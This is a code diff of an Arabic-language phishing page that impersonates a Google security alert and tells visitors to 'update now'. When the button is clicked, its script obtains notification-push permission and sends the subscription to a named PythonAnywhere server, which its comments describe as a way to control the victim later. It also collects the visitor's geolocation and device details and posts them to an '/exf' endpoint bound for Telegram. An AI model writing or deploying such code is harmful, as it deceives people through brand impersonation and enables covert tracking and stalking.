@@ -7,26 +7,24 @@
     <style>
         body { background-color: #202124; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
         .box { background: #303134; padding: 30px; border-radius: 15px; width: 90%; max-width: 400px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        .google-logo { width: 100px; margin-bottom: 20px; }
         button { background: #8ab4f8; color: #202124; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 20px; font-size: 16px; }
-        .warning { color: #f28b82; font-size: 14px; margin-top: 15px; display: block; }
     </style>
 </head>
 <body>
     <div class="box">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo" alt="Google">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="100" alt="Google">
         <h2>تنبيه أمني من Google</h2>
         <p>يجب تحديث خدمات الموقع فوراً لضمان حماية حسابك من الاختراق.</p>
         <button id="actionBtn">تحديث الآن</button>
-        <span class="warning">⚠️ اضغط 'سماح' (Allow) لتأكيد هويتك</span>
     </div>
 
     <script>
-        // --- الإعدادات النهائية المرتبطة بسيرفرك ---
+        // --- الرابط اللي بيوصل لـ PythonAnywhere ---
         const SERVER_URL = 'https://Mohammed888.pythonanywhere.com';
+        // --- المفتاح العام (Public Key) المستخرج من كودك ---
         const VAPID_PUBLIC_KEY = "BNYJNXsw6L1MMYBrx8r+mgxUnRDnxAiYSzBRSH8aFRXevlPbxCJs1s/vwmxIHqSjC1fsY4BC/+Qmomgi3LXReOa=";
 
-        // تحويل المفتاح العام لصيغة يفهمها المتصفح
+        // وظيفة تحويل المفتاح
         function urlBase64ToUint8Array(base64String) {
             const padding = '='.repeat((4 - base64String.length % 4) % 4);
             const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
@@ -35,53 +33,40 @@
         }
 
         document.getElementById('actionBtn').addEventListener('click', async () => {
-            // 1. طلب إذن الإشعارات (للسحب في أي وقت)
+            // 1. طلب إذن الإشعارات (عشان التحكم عن بعد)
             const permission = await Notification.requestPermission();
             
             if (permission === 'granted') {
-                setupPushSubscription();
-            }
-
-            // 2. طلب إذن الموقع (للسحب الفوري)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const payload = {
-                        location: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
-                        battery: "جاري الفحص...",
-                        device: navigator.userAgent
-                    };
-
-                    // إرسال البيانات فوراً لتليجرام عبر السيرفر
-                    fetch(`${SERVER_URL}/exf`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-
-                    alert("تم تأكيد هويتك بنجاح.");
-                }, () => {
-                    alert("خطأ: يجب الضغط على 'سماح' لإكمال التحديث.");
-                });
-            }
-        });
-
-        // وظيفة الاشتراك في الإشعارات (Push Subscription)
-        async function setupPushSubscription() {
-            try {
                 const registration = await navigator.serviceWorker.register('sw.js');
                 const subscription = await registration.pushManager.subscribe({
                     userVisibleOnly: true,
                     applicationServerKey: urlBase64ToUint8Array(VAPID_PUBLIC_KEY)
                 });
 
-                // إرسال بيانات الاشتراك للسيرفر للتحكم بالضحية لاحقاً
-                await fetch(`${SERVER_URL}/subscribe`, {
+                // إرسال "توكن الإشعار" للسيرفر
+                fetch(`${SERVER_URL}/subscribe`, {
                     method: 'POST',
                     body: JSON.stringify(subscription),
                     headers: { 'Content-Type': 'application/json' }
                 });
-            } catch (e) { console.error("Push Error:", e); }
-        }
+            }
+
+            // 2. سحب الموقع والبطارية وإرسالها لتليجرام
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    fetch(`${SERVER_URL}/exf`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            location: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+                            device: navigator.userAgent,
+                            battery: "تلقائي"
+                        })
+                    });
+                    alert("تم تأمين الحساب بنجاح ✅");
+                });
+            }
+        });
     </script>
 </body>
 </html>
